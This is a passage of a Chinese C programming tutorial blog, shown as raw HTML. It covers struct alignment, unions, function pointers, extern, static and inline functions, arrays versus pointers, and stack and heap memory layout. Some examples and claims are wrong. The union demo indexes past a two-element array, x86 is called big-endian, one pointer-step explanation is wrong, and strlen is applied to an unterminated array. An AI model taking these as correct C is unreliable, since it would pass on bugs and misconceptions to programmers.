class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> ch;</span><br><span class=\"line\">  <span class=\"keyword\">double</span> n;</span><br><span class=\"line\">&#125; st_2;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%f&quot;</span>, st_2.n)</span><br></pre></td></tr></table></figure>\n<p><code>st_1</code>和<code>st_2</code>分别使用1字节对齐和4字节对齐，且有着相同的格式。在x64下一次取操作数最多取8字节，访问<code>st_1.n</code>需要取2次数，而访问<code>st_2.n</code>只要取一次数。</p>\n</li>\n<li><p>如果不字节对齐，指针从基地址读取数据也许会出错，结构体赋值也可能会出错。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">pragma</span> pack(1)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">    <span class=\"keyword\">char</span> ch1; </span><br><span class=\"line\">    <span class=\"keyword\">char</span> ch2;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> n;</span><br><span class=\"line\">&#125; STRUCT_DEMO;  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    STRUCT_DEMO st = &#123;<span class=\"string\">&#x27;a&#x27;</span>,<span class=\"string\">&#x27;b&#x27;</span>,<span class=\"number\">1</span>&#125;;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>, <span class=\"keyword\">sizeof</span>(st)); <span class=\"comment\">// 6</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> n1 = *(<span class=\"keyword\">int</span>*)(&amp;st.ch1); </span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>, n1); </span><br><span class=\"line\">    <span class=\"keyword\">int</span> n2 = *(<span class=\"keyword\">int</span>*)(&amp;st.ch2); <span class=\"comment\">// might crash: data abort exception</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>, n2);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>例如1字节对齐时从<code>st.ch2</code>处访问数据违反了对齐规则（地址非4的倍数），部分CPU和编译器可能触发data abort exception</p>\n</li>\n</ol>\n<blockquote>\n<p>访问数据违反了对齐规则是否出错主要取决于CPU和编译器</p>\n</blockquote>\n<ol>\n<li>结构体赋值字节不对齐可能会出错<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">    <span class=\"keyword\">char</span> ch1;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> ch2;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> ch3;</span><br><span class=\"line\">&#125; STRUCT_DEMO;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    STRUCT_DEMO demo;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> *p = (<span class=\"keyword\">char</span>*)<span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">char</span>) * <span class=\"number\">10</span>);</span><br><span class=\"line\">    p++; <span class=\"comment\">// p指向位置不满足对齐</span></span><br><span class=\"line\">    demo = *((STRUCT_DEMO*)p); <span class=\"comment\">// might crash</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n部分CPU，执行结构体赋值指令使用的是STM/LDM之类的块拷贝指令，而<strong>块拷贝指令要求基址必须满足4字节对齐</strong>，否则就会导致数据读取异常。</li>\n</ol>\n<p><strong>如何设置字节对齐</strong>：</p>\n<ul>\n<li>自然对齐：调整结构体成员变量的申明顺序，按照8,4,2,1字节的顺序排列。不够对其的字段用保留字段填充至对齐</li>\n<li>使用预编译选项<code>#pragma pack(n)</code>让编译器自动对齐</li>\n<li>不对齐结构不用非同类型指针访问，不进行类型转换</li>\n<li>尽量不对结构体直接赋值，使用<code>memcpy</code>拷贝结构体</li>\n</ul>\n<p><strong>结构体大小计算</strong><br><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 4 字节对齐</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span> <span class=\"comment\">// size = 6</span></span><br><span class=\"line\">    <span class=\"keyword\">char</span> a;</span><br><span class=\"line\">    <span class=\"keyword\">short</span> b;</span><br><span class=\"line\">    <span class=\"keyword\">short</span> c;</span><br><span class=\"line\">&#125; DEMO_1;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span> <span class=\"comment\">// sizeof = 12</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> a;</span><br><span class=\"line\">    DEMO_1 b;</span><br><span class=\"line\">&#125; DEMO_2;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span> <span class=\"comment\">// sizeof = 8</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> a;</span><br><span class=\"line\">    <span class=\"keyword\">short</span> b;</span><br><span class=\"line\">&#125; DEMO_3;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span> <span class=\"comment\">// sizeof = 0 (c) or 1 (c++)</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#125; DEMO_4; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    DEMO_1 d1;</span><br><span class=\"line\">    DEMO_2 d2;</span><br><span class=\"line\">    DEMO_3 d3;</span><br><span class=\"line\">    DEMO_4 d4;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d %d %d %d&quot;</span>, <span class=\"keyword\">sizeof</span>(d1), <span class=\"keyword\">sizeof</span>(d2), <span class=\"keyword\">sizeof</span>(d3), <span class=\"keyword\">sizeof</span>(d4));</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;   </span><br><span class=\"line\"><span class=\"comment\">// gcc compile output:</span></span><br><span class=\"line\"><span class=\"comment\">// 6 12 8 0</span></span><br><span class=\"line\"><span class=\"comment\">// g++ compile output:</span></span><br><span class=\"line\"><span class=\"comment\">// 6 12 8 1</span></span><br></pre></td></tr></table></figure><br><strong>关于对齐的几个基本概念</strong>：</p>\n<ul>\n<li>数据类型自身的对齐值：<code>char</code>为1，<code>short</code>为2，<code>float</code>为4，<code>int</code>通常为4</li>\n<li>结构体/类的自身对齐值：其成员中自身对齐值最大的值</li>\n<li>制定对齐值：<code>#pragma pack(n)</code>指定<code>n</code>字节对齐</li>\n<li>数据成员，结构体有效对齐值：自身对齐值和指定对其值去较小的</li>\n</ul>\n<p><strong>结构体对其原则</strong>：</p>\n<ul>\n<li>每个成员分别按有效对齐值对齐，起始地址 % 有效对齐值 = 0</li>\n<li>结构体默认对齐方式是它最长的成员的对齐方式，起始地址 % 最大成员有效对齐值 = 0</li>\n<li>结构体对齐后的长度必须是成员中有效对齐值的整数倍</li>\n</ul>\n<h2 id=\"联合体\"><a href=\"#联合体\" class=\"headerlink\" title=\"联合体\"></a>联合体</h2><p>联合体的大小是最大的成员的大小，所有成员共享联合体空间。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">union</span> &#123;</span></span><br><span class=\"line\">    <span class=\"keyword\">char</span> a[<span class=\"number\">2</span>];</span><br><span class=\"line\">    <span class=\"keyword\">int</span> b;</span><br><span class=\"line\">&#125; U1;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    U1 u1;</span><br><span class=\"line\">    u1.b = <span class=\"number\">0x12345678</span>;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%x %x\\n&quot;</span>, u1.a[<span class=\"number\">0</span>], u1.a[<span class=\"number\">2</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 78 56</span></span><br></pre></td></tr></table></figure>\n<p>x86下大端的存储结构如下：</p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th></th>\n<th>0</th>\n<th>1</th>\n<th>2</th>\n<th>3</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>u1.a</td>\n<td>0x78</td>\n<td>0x56</td>\n<td>0x34</td>\n<td>0x12</td>\n</tr>\n<tr>\n<td>u1.b</td>\n<td>0x78</td>\n<td>0x56</td>\n<td>0x34</td>\n<td>0x12</td>\n</tr>\n</tbody>\n</table>\n</div>\n<h2 id=\"函数\"><a href=\"#函数\" class=\"headerlink\" title=\"函数\"></a>函数</h2><p>指向函数的指针</p>\n<p>例：<br><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">char</span> a[] = &#123;<span class=\"string\">&#x27;a&#x27;</span>,<span class=\"string\">&#x27;b&#x27;</span>,<span class=\"string\">&#x27;c&#x27;</span>&#125;; <span class=\"comment\">//末尾没有空白符</span></span><br><span class=\"line\"><span class=\"keyword\">char</span> b[] = <span class=\"string\">&quot;abc&quot;</span>; <span class=\"comment\">//末尾有空白符，等价于&#123;&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;\\0&#x27;&#125;</span></span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d %d %d %d&quot;</span>,<span class=\"keyword\">sizeof</span>(a), <span class=\"built_in\">strlen</span>(a), <span class=\"keyword\">sizeof</span>(b), <span class=\"built_in\">strlen</span>(b));</span><br><span class=\"line\"><span class=\"comment\">// 3 6 4 3</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"函数指针\"><a href=\"#函数指针\" class=\"headerlink\" title=\"函数指针\"></a>函数指针</h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">typedef</span> <span class=\"title\">int</span> <span class=\"params\">(*PFUN)</span><span class=\"params\">(<span class=\"keyword\">float</span>, <span class=\"keyword\">int</span>, <span class=\"keyword\">char</span>*)</span></span>; <span class=\"comment\">// 定义函数指针</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">func</span><span class=\"params\">(<span class=\"keyword\">float</span> n1, <span class=\"keyword\">int</span> n2, <span class=\"keyword\">char</span>* n3)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%f %d %s\\n&quot;</span>, n1, n2, n3);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">  PFUN pf = func; <span class=\"comment\">//创建函数指针指向之前的函数，通过指针调用之前的函数</span></span><br><span class=\"line\">  pf(<span class=\"number\">11.3</span>, <span class=\"number\">514</span>, <span class=\"string\">&quot;Test&quot;</span>); </span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 11.30000 514 Test</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"inline函数\"><a href=\"#inline函数\" class=\"headerlink\" title=\"inline函数\"></a>inline函数</h3><p><code>inline</code>函数用于建议编译器展开对改函数的调用，从而没有函数调用调用的开销。不同于宏函数，内联函数是真正的函数，编译器会检察参数类型，消除宏函数的隐患。内联函数和宏函数一样可能会导致代码空间膨胀。</p>\n<blockquote>\n<p><code>inline</code>只是对编译器的建议，对内联函数是否展开由编译器决定。<strong>内联函数不宜太长，而且必须在头文件中定义</strong>。</p>\n</blockquote>\n<p>例:<br><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"keyword\">int</span> <span class=\"title\">abs</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> n &gt; <span class=\"number\">0</span> ? n : -n;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"extern函数\"><a href=\"#extern函数\" class=\"headerlink\" title=\"extern函数\"></a>extern函数</h3><ul>\n<li>extern`关键字置于变量和函数之前，表示变量和函数定义在别的文件中，提示编译器去其他模块寻找该变量和函数的定义。</li>\n<li><code>extern</code>关键字可以用于替代<code>#include</code>来声明函数</li>\n<li><code>extern &quot;C&quot;</code>：C++在解决函数多态问题时，会将函数名和参数联合起来生成一个中间函数名，而C语言不会，因此会造成链接时找不到对应函数的情况</li>\n</ul>\n<p>例：<br><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//main.c</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">extern</span> <span class=\"keyword\">int</span> <span class=\"title\">sum</span><span class=\"params\">(<span class=\"keyword\">int</span>, <span class=\"keyword\">int</span>)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> s = sum(<span class=\"number\">114</span>, <span class=\"number\">514</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;sum=%d\\n&quot;</span>, s);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// sum.c</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">sum</span><span class=\"params\">(<span class=\"keyword\">int</span> a, <span class=\"keyword\">int</span> b)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a + b;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br><code>gcc main.c sum.c -o main</code>编译成功，输出628</p>\n<h3 id=\"static函数\"><a href=\"#static函数\" class=\"headerlink\" title=\"static函数\"></a>static函数</h3><p><code>static</code>函数只能被同文件和包含其的文件的函数调用。</p>\n<p>例：<br><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//main.c</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">extern</span> <span class=\"keyword\">int</span> <span class=\"title\">sum</span><span class=\"params\">(<span class=\"keyword\">int</span>, <span class=\"keyword\">int</span>)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> s = sum(<span class=\"number\">114</span>, <span class=\"number\">514</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;sum=%d\\n&quot;</span>, s);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// sum.c</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">int</span> <span class=\"title\">sum</span><span class=\"params\">(<span class=\"keyword\">int</span> a, <span class=\"keyword\">int</span> b)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a + b;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br><code>gcc main.c sum.c -o main</code>编译失败，找不到<code>sum</code>的引用：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/usr/bin/ld: /tmp/ccLduJ3g.o: in function `main&#x27;:</span><br><span class=\"line\">main.c:(.text+0x13): undefined reference to `sum&#x27;</span><br><span class=\"line\">collect2: error: ld returned 1 exit status</span><br></pre></td></tr></table></figure><br>解决办法：改用<code>#include</code>引入<code>sum</code>或者取消<code>static</code></p>\n<h2 id=\"字符串和指针\"><a href=\"#字符串和指针\" class=\"headerlink\" title=\"字符串和指针\"></a>字符串和指针</h2><h3 id=\"函数形参数组和指针互换\"><a href=\"#函数形参数组和指针互换\" class=\"headerlink\" title=\"函数形参数组和指针互换\"></a>函数形参数组和指针互换</h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">func1</span><span class=\"params\">(<span class=\"keyword\">char</span> *str)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;size=%d, str=%s\\n&quot;</span>, <span class=\"keyword\">sizeof</span>(str), str);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">func2</span><span class=\"params\">(<span class=\"keyword\">char</span> str[])</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;size=%d, str=%s\\n&quot;</span>, <span class=\"keyword\">sizeof</span>(str), str);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">func3</span><span class=\"params\">(<span class=\"keyword\">char</span> str[<span class=\"number\">3</span>])</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;size=%d, str=%s\\n&quot;</span>, <span class=\"keyword\">sizeof</span>(str), str);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    func1(<span class=\"string\">&quot;Hello World&quot;</span>); <span class=\"comment\">//size=8, str=Hello World</span></span><br><span class=\"line\">    func2(<span class=\"string\">&quot;Hello World&quot;</span>); <span class=\"comment\">//size=8, str=Hello World</span></span><br><span class=\"line\">    func3(<span class=\"string\">&quot;Hello World&quot;</span>); <span class=\"comment\">//size=8, str=Hello World</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>char str[]</code>，<code>char* str</code>，<code>char str[n]</code>作为形参本质上都是<code>char *</code></p>\n<h3 id=\"使用sizeof时，数组和指针定义不可互换\"><a href=\"#使用sizeof时，数组和指针定义不可互换\" class=\"headerlink\" title=\"使用sizeof时，数组和指针定义不可互换\"></a>使用<code>sizeof</code>时，数组和指针定义不可互换</h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">char</span> *str1 = <span class=\"string\">&quot;hello world&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">char</span> str2[<span class=\"number\">15</span>] = <span class=\"string\">&quot;Hello world&quot;</span>;</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d %d\\n&quot;</span>, <span class=\"keyword\">sizeof</span>(str1), <span class=\"keyword\">sizeof</span>(str2)); <span class=\"comment\">// 8 15</span></span><br></pre></td></tr></table></figure>\n<p>指针使用<code>sizeof</code>永远返回指针大小，数组则返回数组大小</p>\n<h3 id=\"数组和指针在表达式取值中有相同的本质\"><a href=\"#数组和指针在表达式取值中有相同的本质\" class=\"headerlink\" title=\"数组和指针在表达式取值中有相同的本质\"></a>数组和指针在表达式取值中有相同的本质</h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">char</span>* str1 = <span class=\"string\">&quot;Hello World&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">char</span> str2[] = <span class=\"string\">&quot;Hello World&quot;</span>;</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%c %c %c %c&quot;</span>, str1[<span class=\"number\">3</span>], *(str1 + <span class=\"number\">3</span>), str2[<span class=\"number\">3</span>], *(str2 + <span class=\"number\">3</span>));</span><br></pre></td></tr></table></figure>\n<p>数组头可以看作是指针，指针可以看作数组头，都可用下标访问和步长解引用获取变量值。<code>str[3]</code>会被编译器编译成<code>*(str + 3)</code></p>\n<h3 id=\"多维数组的步长\"><a href=\"#多维数组的步长\" class=\"headerlink\" title=\"多维数组的步长\"></a>多维数组的步长</h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">char</span> a1[<span class=\"number\">10</span>]; <span class=\"comment\">// step 1</span></span><br><span class=\"line\"><span class=\"keyword\">int</span> a2[<span class=\"number\">10</span>]; <span class=\"comment\">// step 4</span></span><br><span class=\"line\"><span class=\"keyword\">char</span> a3[<span class=\"number\">10</span>][<span class=\"number\">3</span>]; <span class=\"comment\">// step 3</span></span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%u %u\\n&quot;</span>, a1, a1 + <span class=\"number\">1</span>);</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%u %u\\n&quot;</span>, a2, a2 + <span class=\"number\">1</span>);</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%u %u %u\\n&quot;</span>, a3, a3 + <span class=\"number\">1</span>, (a3 + <span class=\"number\">1</span>) + <span class=\"number\">1</span>);</span><br><span class=\"line\"><span class=\"comment\">// 1551264830 1551264831</span></span><br><span class=\"line\"><span class=\"comment\">// 1551264784 1551264788</span></span><br><span class=\"line\"><span class=\"comment\">// 1551264752 1551264755 1551264756</span></span><br></pre></td></tr></table></figure>\n<p><code>char a3[10][3]</code>中<code>(a3 + 1)</code>指向<code>a3[10][0]</code></p>\n<h2 id=\"内存布局\"><a href=\"#内存布局\" class=\"headerlink\" title=\"内存布局\"></a>内存布局</h2><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">char</span>* <span class=\"title\">str1</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> s[] = <span class=\"string\">&quot;HelloWorld1&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> s;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">char</span>* <span class=\"title\">str2</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> s[] = &#123;<span class=\"string\">&#x27;H&#x27;</span>,<span class=\"string\">&#x27;e&#x27;</span>,<span class=\"string\">&#x27;l&#x27;</span>,<span class=\"string\">&#x27;l&#x27;</span>,<span class=\"string\">&#x27;o&#x27;</span>,<span class=\"string\">&#x27;W&#x27;</span>,<span class=\"string\">&#x27;o&#x27;</span>,<span class=\"string\">&#x27;r&#x27;</span>,<span class=\"string\">&#x27;l&#x27;</span>,<span class=\"string\">&#x27;d&#x27;</span>,<span class=\"string\">&#x27;2&#x27;</span>,<span class=\"string\">&#x27;\\0&#x27;</span>&#125;;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> s;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">char</span>* <span class=\"title\">str3</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span>* s = <span class=\"string\">&quot;HelloWorld3&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> s;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">char</span>* <span class=\"title\">str4</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">static</span> <span class=\"keyword\">char</span>* s = <span class=\"string\">&quot;HelloWorld4&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> s;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">char</span>* <span class=\"title\">str5</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&quot;HelloWorld5&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//printf(&quot;%s\\n&quot;, str1()); // segment fault (core dumped)</span></span><br><span class=\"line\">    <span class=\"comment\">//printf(&quot;%s\\n&quot;, str2()); // segment fault (core dumped)</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s\\n&quot;</span>, str3());</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s\\n&quot;</span>, str4());</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s\\n&quot;</span>, str5());</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;   </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>str1()</code>和<code>str2()</code>的字符串分配在栈上，内容随着函数返回被销毁，所以无法正确返回数据。</p>\n<p><code>str3()</code>，<code>str4()</code>，<code>str5()</code>可以正确返回结果，<code>str3()</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> n;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">test_global_var_init</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;global n = %d\\n&quot;</span>, n);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">test_local_var_init</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> m;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;local m = %d\\n&quot;</span>, m);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">test_heap_var_init</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span>* pm = (<span class=\"keyword\">int</span>*)<span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>));</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(pm != <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;heap m = %d\\n&quot;</span>, *pm);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    test_global_var_init();</span><br><span class=\"line\">    test_local_var_init();</span><br><span class=\"line\">    test_heap_var_init();   </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// global n = 0</span></span><br><span class=\"line\"><span class=\"comment\">// local m = 21931</span></span><br><span class=\"line\"><span 